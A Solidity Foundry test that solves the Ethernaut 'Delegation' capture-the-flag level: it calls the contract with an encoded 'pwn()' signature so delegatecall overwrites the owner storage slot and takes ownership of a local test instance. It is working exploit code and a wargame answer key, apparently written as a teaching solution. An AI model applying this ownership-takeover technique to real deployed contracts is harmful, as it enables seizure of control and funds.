pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Delegation/DelegationFactory.sol"; // <====== REPLACE THIS
import "../Ethernaut.sol";
import "./utils/vm.sol";

/*
    Solution Notes:
    - use the delegation callback to call the pwn function by encoding the 
    fn call using its signature
    - `owner` for both contracts occupy the same storage slot, so calling the function
    using delegate call changes the storage in the caller's slot, not hte contract
    being called
*/

contract DelegationHack is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testDelegationHack() public {
        // ========================= LEVEL SETUP
        // fund the EOA
        vm.deal(eoaAddress, 5 ether);

        // create the factory
        DelegationFactory delegationFactory = new DelegationFactory();

        // register the level
        ethernaut.registerLevel(delegationFactory);

        // start pranking the user
        vm.startPrank(eoaAddress);

        // instantiate the level
        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
        Delegation ethernaughtDelegation = Delegation(payable(levelAddress));

        // =========================  ATTACK
        emit log_named_address(
            "owner of delegation before: ",
            ethernaughtDelegation.owner()
        );

        (bool success, ) = address(ethernaughtDelegation).call{value: 0}(
            abi.encodeWithSignature("pwn()")
        );

        emit log_named_address(
            "owner of delegation after: ",
            ethernaughtDelegation.owner()
        );
        // ========================= SUBMISSION

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
